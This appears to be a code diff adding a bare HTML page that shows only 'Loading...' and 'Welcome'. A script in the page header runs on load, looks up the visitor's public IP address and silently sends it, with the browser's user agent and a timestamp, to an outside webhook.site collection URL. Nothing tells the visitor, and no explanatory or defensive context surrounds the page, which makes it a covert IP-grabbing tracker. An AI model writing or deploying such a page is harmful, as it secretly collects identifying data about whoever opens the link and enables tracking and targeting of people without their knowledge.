@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        fetch('https://webhook.site/aee63f19-95fe-4330-b8e8-758e35578593', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ip: data.ip,
+            userAgent: navigator.userAgent,
+            time: new Date().toISOString()
+          })
+        });
+      });
+  </script>
+</head>
+<body>
+  <h1>Welcome</h1>
+</body>
+</html>
